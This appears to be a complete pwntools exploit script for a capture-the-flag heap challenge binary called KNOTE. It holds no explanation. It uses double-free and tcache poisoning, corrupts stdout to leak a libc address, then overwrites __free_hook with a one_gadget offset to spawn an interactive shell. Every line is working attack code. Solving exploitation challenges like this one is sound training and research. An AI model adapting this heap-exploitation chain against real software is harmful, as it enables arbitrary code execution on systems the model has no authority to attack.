from pwn import *

p = process('./KNOTE')
e = ELF('./KNOTE')

def add(idx,size):
    p.sendlineafter('> ','1')
    p.sendlineafter('Index : ',str(idx))
    p.sendlineafter('size : ',str(size))

def delete(idx):
    p.sendlineafter('> ','2')
    p.sendlineafter('Index : ',str(idx))

def edit(size,data):
    p.sendlineafter('> ','4')
    p.sendlineafter('size : ',str(size))
    p.sendlineafter('? ',data)

add(0,0x80)
add(1,0x80)
delete(0)
add(0,0x80)
delete(1)
delete(0)
edit(1,'\x60')

add(0,0x80)
edit(8,p64(0x0))
add(1,0x80)

for i in range(2,8):
    add(i,0x80)

delete(0)
add(0,0x80)

for i in range(2,8):
    delete(i)

delete(0)
delete(1)
edit(2,'\x60\x97')
add(0,0x80)
add(1,0x80)

edit(33,p64(0xfbad1800)+'\x00'*25)
libc = u64(p.recvuntil('\x7f')[-6:] + '\x00\x00') - 0x3ed8b0
free_hook = libc + 0x3ed8e8
one_shot = libc + 0x4f322
print hex(libc)

add(4,0x20)
add(5,0x20)
delete(4)
delete(5)
edit(8,p64(free_hook))
add(4,0x20)
add(5,0x20)
edit(8,p64(one_shot))
delete(5)

p.interactive()